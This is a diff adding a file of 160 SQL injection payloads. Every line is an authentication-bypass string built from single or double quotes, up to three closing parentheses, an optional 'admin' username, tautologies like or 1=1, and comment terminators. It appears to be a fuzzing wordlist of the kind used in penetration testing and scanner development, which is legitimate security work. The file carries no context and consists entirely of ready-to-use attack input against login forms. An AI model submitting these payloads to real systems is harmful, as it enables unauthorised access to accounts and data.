@@ -1,0 +1,160 @@
+' -- s
+' # s
+' /* s
+' or 1=1 -- s
+' or 1=1 # s
+' or 1=1 /* s
+' or 1=1 limit 1 -- s
+' or 1=1 limit 1 # s
+' or 1=1 limit 1 /* s
+' or '1'='1
+') -- s
+') # s
+') /* s
+') or 1=1 -- s
+') or 1=1 # s
+') or 1=1 /* s
+' or 1=1 ) limit 1 -- s
+' or 1=1 ) limit 1 # s
+' or 1=1 ) limit 1 /* s
+' or 1=1) or ('1'='1
+')) -- s
+')) # s
+')) /* s
+')) or 1=1 -- s
+')) or 1=1 # s
+')) or 1=1 /* s
+' or 1=1 )) limit 1 -- s
+' or 1=1 )) limit 1 # s
+' or 1=1 )) limit 1 /* s
+' or 1=1)) or (('1'='1
+'))) -- s
+'))) # s
+'))) /* s
+'))) or 1=1 -- s
+'))) or 1=1 # s
+'))) or 1=1 /* s
+' or 1=1 ))) limit 1 -- s
+' or 1=1 ))) limit 1 # s
+' or 1=1 ))) limit 1 /* s
+' or 1=1))) or ((('1'='1
+admin' -- s
+admin' # s
+admin' /* s
+admin' or 1=1 -- s
+admin' or 1=1 # s
+admin' or 1=1 /* s
+admin' or 1=1 limit 1 -- s
+admin' or 1=1 limit 1 # s
+admin' or 1=1 limit 1 /* s
+admin' or '1'='1
+admin') -- s
+admin') # s
+admin') /* s
+admin') or 1=1 -- s
+admin') or 1=1 # s
+admin') or 1=1 /* s
+admin' or 1=1 ) limit 1 -- s
+admin' or 1=1 ) limit 1 # s
+admin' or 1=1 ) limit 1 /* s
+admin' or 1=1) or ('1'='1
+admin')) -- s
+admin')) # s
+admin')) /* s
+admin')) or 1=1 -- s
+admin')) or 1=1 # s
+admin')) or 1=1 /* s
+admin' or 1=1 )) limit 1 -- s
+admin' or 1=1 )) limit 1 # s
+admin' or 1=1 )) limit 1 /* s
+admin' or 1=1)) or (('1'='1
+admin'))) -- s
+admin'))) # s
+admin'))) /* s
+admin'))) or 1=1 -- s
+admin'))) or 1=1 # s
+admin'))) or 1=1 /* s
+admin' or 1=1 ))) limit 1 -- s
+admin' or 1=1 ))) limit 1 # s
+admin' or 1=1 ))) limit 1 /* s
+admin' or 1=1))) or ((('1'='1
+" -- s
+" # s
+" /* s
+" or 1=1 -- s
+" or 1=1 # s
+" or 1=1 /* s
+" or 1=1 limit 1 -- s
+" or 1=1 limit 1 # s
+" or 1=1 limit 1 /* s
+" or "1"="1
+") -- s
+") # s
+") /* s
+") or 1=1 -- s
+") or 1=1 # s
+") or 1=1 /* s
+" or 1=1 ) limit 1 -- s
+" or 1=1 ) limit 1 # s
+" or 1=1 ) limit 1 /* s
+" or 1=1) or ("1"="1
+")) -- s
+")) # s
+")) /* s
+")) or 1=1 -- s
+")) or 1=1 # s
+")) or 1=1 /* s
+" or 1=1 )) limit 1 -- s
+" or 1=1 )) limit 1 # s
+" or 1=1 )) limit 1 /* s
+" or 1=1)) or (("1"="1
+"))) -- s
+"))) # s
+"))) /* s
+"))) or 1=1 -- s
+"))) or 1=1 # s
+"))) or 1=1 /* s
+" or 1=1 ))) limit 1 -- s
+" or 1=1 ))) limit 1 # s
+" or 1=1 ))) limit 1 /* s
+" or 1=1))) or ((("1"="1
+admin" -- s
+admin" # s
+admin" /* s
+admin" or 1=1 -- s
+admin" or 1=1 # s
+admin" or 1=1 /* s
+admin" or 1=1 limit 1 -- s
+admin" or 1=1 limit 1 # s
+admin" or 1=1 limit 1 /* s
+admin" or "1"="1
+admin") -- s
+admin") # s
+admin") /* s
+admin") or 1=1 -- s
+admin") or 1=1 # s
+admin") or 1=1 /* s
+admin" or 1=1 ) limit 1 -- s
+admin" or 1=1 ) limit 1 # s
+admin" or 1=1 ) limit 1 /* s
+admin" or 1=1) or ("1"="1
+admin")) -- s
+admin")) # s
+admin")) /* s
+admin")) or 1=1 -- s
+admin")) or 1=1 # s
+admin")) or 1=1 /* s
+admin" or 1=1 )) limit 1 -- s
+admin" or 1=1 )) limit 1 # s
+admin" or 1=1 )) limit 1 /* s
+admin" or 1=1)) or (("1"="1
+admin"))) -- s
+admin"))) # s
+admin"))) /* s
+admin"))) or 1=1 -- s
+admin"))) or 1=1 # s
+admin"))) or 1=1 /* s
+admin" or 1=1 ))) limit 1 -- s
+admin" or 1=1 ))) limit 1 # s
+admin" or 1=1 ))) limit 1 /* s
+admin" or 1=1))) or ((("1"="1
